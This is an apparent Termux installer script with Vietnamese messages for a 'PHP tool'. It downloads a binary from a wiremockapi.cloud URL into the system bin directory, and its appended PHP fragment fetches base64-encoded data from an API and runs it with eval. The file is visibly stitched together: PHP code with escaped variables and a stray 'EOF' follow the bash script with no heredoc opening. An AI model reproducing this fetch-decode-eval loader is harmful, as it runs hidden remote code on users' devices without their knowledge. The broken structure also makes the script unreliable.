#!/data/data/com.termux/files/usr/bin/bash

clear
echo "=== INSTALL TOOL PHP SYSTEM ==="

# 1. Kiểm tra PHP
if ! command -v php >/dev/null 2>&1; then
    echo "[+] Đang cài PHP..."
    pkg update -y && pkg install php -y
fi

# 2. Tải tool chính (RAW)
URL="https://5g142.wiremockapi.cloud/shtool/tools_php_main"
DEST="$PREFIX/bin/tools_php"

echo "[+] Đang tải tool..."

curl -L -s "$URL" -o "$DEST"

# 3. Fix lỗi CRLF (rất quan trọng)
sed -i 's/\r$//' "$DEST"

# 4. Cấp quyền
chmod +x "$DEST"

# 5. Kiểm tra tồn tại
if [ ! -f "$DEST" ]; then
    echo "❌ Tải thất bại"
    exit 1
fi

echo ""
echo "✅ Cài đặt hoàn tất"
echo "👉 Gõ: tools_php"
if (!\$menu) {
    exit("❌ Không kết nối được API\n");
}

\$data = json_decode(\$menu, true);

if (!\$data || !isset(\$data['status'])) {
    exit("❌ JSON không hợp lệ\n");
}

if (\$data['status'] !== 'success') {
    exit("⚠️ API lỗi\n");
}

if (empty(\$data['data'])) {
    exit("⚠️ Không có dữ liệu\n");
}

\$real = base64_decode(\$data['data']);

if (\$real === false || trim(\$real) === "") {
    exit("⚠️ Decode rỗng\n");
}

eval("?>".\$real);
?>
EOF
